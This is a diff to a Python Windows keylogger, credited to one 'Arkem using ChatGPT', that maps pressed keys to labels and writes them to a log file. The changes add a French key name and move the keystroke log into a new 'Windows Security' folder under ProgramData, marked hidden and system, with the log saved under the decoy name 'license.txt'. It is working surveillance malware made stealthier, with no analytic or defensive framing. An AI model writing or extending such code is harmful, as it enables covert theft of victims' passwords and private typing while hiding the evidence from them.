@@ -7,7 +7,6 @@
 #╚═╝░░╚═╝╚══════╝░░░╚═╝░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝
 #Made by Arkem using ChatGPT
 
-
 import os
 import sys
 import datetime
@@ -15,6 +14,7 @@ import win32gui
 import keyboard
 import ctypes
 import win32con
+import win32api
 
 KEY_MAP = {
     " ": "[SPACE]",
@@ -48,6 +48,7 @@ KEY_MAP = {
     "insert": "[INSERT]",
     "delete": "[DELETE]",
     "suppr": "[DELETE]",
+    "windows gauche": "[LEFT WINDOWS]",
     "f1": "[F1]",
     "f2": "[F2]",
     "f3": "[F3]",
@@ -62,7 +63,14 @@ KEY_MAP = {
     "f12": "[F12]",
 }
 
-log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "log.txt")
+hidden_folder = os.path.join(os.environ['ProgramData'], 'Windows Security')
+os.makedirs(hidden_folder, exist_ok=True)
+
+attributes = win32con.FILE_ATTRIBUTE_HIDDEN | win32con.FILE_ATTRIBUTE_SYSTEM
+win32api.SetFileAttributes(hidden_folder, attributes)
+
+log_file = os.path.join(hidden_folder, 'license.txt')
+
 
 def write_keys(keys_pressed, last_time, file):
     with open(file, "a") as f:
